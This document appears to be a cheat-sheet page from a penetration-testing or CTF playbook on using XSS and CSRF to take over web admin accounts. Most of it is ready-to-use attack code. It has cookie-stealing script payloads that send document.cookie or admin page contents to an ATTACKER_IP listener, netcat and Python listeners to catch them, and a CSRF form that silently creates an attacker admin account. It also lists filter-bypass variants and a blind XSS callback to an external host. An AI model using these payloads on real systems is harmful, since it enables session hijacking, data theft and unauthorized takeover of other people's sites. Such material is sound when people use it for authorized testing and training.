---
id: xss-csrf
title: XSS / CSRF
stage: initial-access
tags: [web]
summary: Steal admin session cookies via reflected or stored XSS, or forge authenticated requests via CSRF — used to pivot from a low-priv web account to an admin context with additional attack surface.
leads_to:
  - file-upload-shell
  - sqli-rce
---

## Prerequisites

A web application where you can inject content that an admin user will view (stored XSS in a support ticket, comment, profile field) or an endpoint without CSRF protection that performs privileged actions. XSS requires `document.cookie` to not be `HttpOnly`.

XSS in a CTF/exam context is almost always about cookie theft or CSRF-chaining to reach functionality you can't access directly. The goal is: inject payload → admin views it → their cookie/token is sent to you → use it to log in as admin → find attack surface (file upload, SQLi, command execution) that only admins can reach.

## Quick Win

> Confirm XSS with an alert, then immediately pivot to cookie theft — don't waste time on alert chains.

```javascript
// Confirm
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
'><svg onload=alert(1)>

// Cookie theft — send to your listener
<script>document.location='http://ATTACKER_IP/c='+document.cookie</script>
<script>fetch('http://ATTACKER_IP/?c='+btoa(document.cookie))</script>
<img src=x onerror="fetch('http://ATTACKER_IP/?c='+document.cookie)">
```

## Listener for Cookie Capture

```bash
# Simple Python listener
python3 -m http.server 80

# Or nc
nc -nvlp 80
```

## Bypass HttpOnly — Steal Session via XHR

> If HttpOnly is set, steal the page content instead of the cookie.

```javascript
<script>
fetch('/admin/users').then(r=>r.text()).then(d=>
  fetch('http://ATTACKER_IP/?d='+btoa(d))
)
</script>
```

## CSRF — Forge Admin Action

> No CSRF token? Forge a request from the admin's browser context.

```html
<!-- Host this page — get admin to visit it (or use XSS to inject it) -->
<html><body>
<form id="f" action="http://TARGET/admin/adduser" method="POST">
  <input name="username" value="attacker">
  <input name="password" value="Password123">
  <input name="role" value="admin">
</form>
<script>document.getElementById('f').submit()</script>
</body></html>
```

## Common Filter Bypasses

```javascript
// Encoded angle brackets
&lt;script&gt;alert(1)&lt;/script&gt;  ← this won't work, use:
<ScRiPt>alert(1)</ScRiPt>              // case
<script>alert`1`</script>             // backtick (no parens)
javascript:alert(1)                    // in href
<svg/onload=alert(1)>                 // self-closing
```

## Blind XSS (Admin Reviews Input)

> XSS Hunter or interactserver — use when you don't know when/if the admin views your input.

```javascript
// XSS Hunter payload (replace with your domain)
<script src="https://YOUR.xss.ht"></script>

// DIY callback
<script>
var i=new Image();
i.src='http://ATTACKER_IP/xss?cookie='+encodeURIComponent(document.cookie)
+'&url='+encodeURIComponent(document.location);
</script>
```

## Leads To

Admin cookie captured → log in as admin → look for file upload forms (→ file-upload-shell), SQLi in admin search/filter fields (→ sqli-rce), or command execution in admin utilities. Admin panel often has debug/maintenance features not available to regular users — enumerate it fully before attacking.
